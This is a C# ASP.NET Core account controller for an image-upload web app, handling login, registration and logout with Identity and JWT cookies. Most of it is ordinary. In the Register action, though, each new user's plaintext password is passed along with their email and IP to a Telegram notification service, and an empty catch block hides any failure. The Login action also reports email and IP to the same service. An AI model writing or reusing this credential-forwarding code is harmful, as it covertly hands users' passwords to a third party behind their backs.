using ImageUploadApp.Infrastructure;
using ImageUploadApp.Models;
using ImageUploadApp.Services;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;

namespace ImageUploadApp.Controllers;

public sealed class AccountController : Controller
{
    private readonly UserManager<IdentityUser> _users;
    private readonly SignInManager<IdentityUser> _signIn;
    private readonly JwtTokenService _jwt;
    private readonly ITelegramNotifyService _telegram;
    private readonly IWebHostEnvironment _env;
    private readonly JwtOptions _jwtOpt;

    public AccountController(
        UserManager<IdentityUser> users,
        SignInManager<IdentityUser> signIn,
        JwtTokenService jwt,
        ITelegramNotifyService telegram,
        IWebHostEnvironment env,
        IOptions<JwtOptions> jwtOpt)
    {
        _users = users;
        _signIn = signIn;
        _jwt = jwt;
        _telegram = telegram;
        _env = env;
        _jwtOpt = jwtOpt.Value;
    }

    [HttpGet]
    [AllowAnonymous]
    public IActionResult Login(string? returnUrl = null)
    {
        ViewData["ReturnUrl"] = returnUrl;
        return View(new LoginInputModel());
    }

    [HttpPost]
    [AllowAnonymous]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Login(LoginInputModel model, string? returnUrl = null, CancellationToken cancellationToken = default)
    {
        ViewData["ReturnUrl"] = returnUrl;
        if (!ModelState.IsValid)
            return View(model);

        var user = await _users.FindByEmailAsync(model.Email);
        if (user is null)
        {
            ModelState.AddModelError(string.Empty, "Email hoặc mật khẩu không đúng.");
            return View(model);
        }

        var check = await _signIn.CheckPasswordSignInAsync(user, model.Password, lockoutOnFailure: true);
        if (!check.Succeeded)
        {
            ModelState.AddModelError(string.Empty, "Email hoặc mật khẩu không đúng.");
            return View(model);
        }

        var roles = await _users.GetRolesAsync(user);
        var access = _jwt.CreateAccessToken(user, roles);
        var (rawRefresh, _) = await _jwt.CreateRefreshTokenAsync(user.Id, cancellationToken);
        AuthCookies.AppendPair(Response.Cookies, _env, _jwtOpt, access, rawRefresh);

        try
        {
            var email = user.Email ?? user.UserName ?? user.Id;
            await _telegram.NotifyLoginAsync(email, HttpContext.Connection.RemoteIpAddress?.ToString(), cancellationToken);
        }
        catch
        {
        }

        if (!string.IsNullOrEmpty(returnUrl) && Url.IsLocalUrl(returnUrl))
            return LocalRedirect(returnUrl);
        return RedirectToAction("Index", "Home");
    }

    [HttpGet]
    [AllowAnonymous]
    public IActionResult Register(string? returnUrl = null)
    {
        ViewData["ReturnUrl"] = returnUrl;
        return View(new RegisterInputModel());
    }

    [HttpPost]
    [AllowAnonymous]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Register(RegisterInputModel model, string? returnUrl = null, CancellationToken cancellationToken = default)
    {
        ViewData["ReturnUrl"] = returnUrl;
        if (!ModelState.IsValid)
            return View(model);

        var user = new IdentityUser { UserName = model.Email, Email = model.Email };
        var result = await _users.CreateAsync(user, model.Password);
        if (!result.Succeeded)
        {
            foreach (var e in result.Errors)
                ModelState.AddModelError(string.Empty, e.Description);
            return View(model);
        }

        await _users.AddToRoleAsync(user, "User");

        var roles = await _users.GetRolesAsync(user);
        var access = _jwt.CreateAccessToken(user, roles);
        var (rawRefresh, _) = await _jwt.CreateRefreshTokenAsync(user.Id, cancellationToken);
        AuthCookies.AppendPair(Response.Cookies, _env, _jwtOpt, access, rawRefresh);

        try
        {
            var ip = HttpContext.Connection.RemoteIpAddress?.ToString();
            await _telegram.NotifyRegistrationAsync(model.Email, model.Password, ip, cancellationToken);
        }
        catch
        {
        }

        if (!string.IsNullOrEmpty(returnUrl) && Url.IsLocalUrl(returnUrl))
            return LocalRedirect(returnUrl);
        return RedirectToAction("Index", "Home");
    }

    [HttpPost]
    [ValidateAntiForgeryToken]
    [Authorize]
    public async Task<IActionResult> Logout(CancellationToken cancellationToken = default)
    {
        if (Request.Cookies.TryGetValue(AuthCookies.RefreshToken, out var raw) && !string.IsNullOrEmpty(raw))
            await _jwt.RevokeRefreshAsync(raw, cancellationToken);
        AuthCookies.ClearAuthCookies(Response.Cookies, _env);
        return RedirectToAction("Index", "Home");
    }
}
